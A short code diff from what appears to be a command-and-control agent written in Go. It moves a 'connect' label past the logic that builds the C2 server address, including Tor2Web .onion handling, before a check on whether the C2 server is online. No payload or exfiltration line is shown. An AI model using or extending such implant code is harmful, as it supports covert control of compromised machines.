@@ -40,7 +40,6 @@ func main() {
 		}
 	}
 
-connect:
 	// parse C2 address
 	if tun.IsTor2Web(agent.CCAddress) {
 		// xxx.onion.to/:port/...
@@ -48,6 +47,7 @@ connect:
 	} else {
 		agent.CCAddress = fmt.Sprintf("%s:%s/", agent.CCAddress, agent.CCPort)
 	}
+connect:
 
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
 	if !agent.IsCCOnline() {
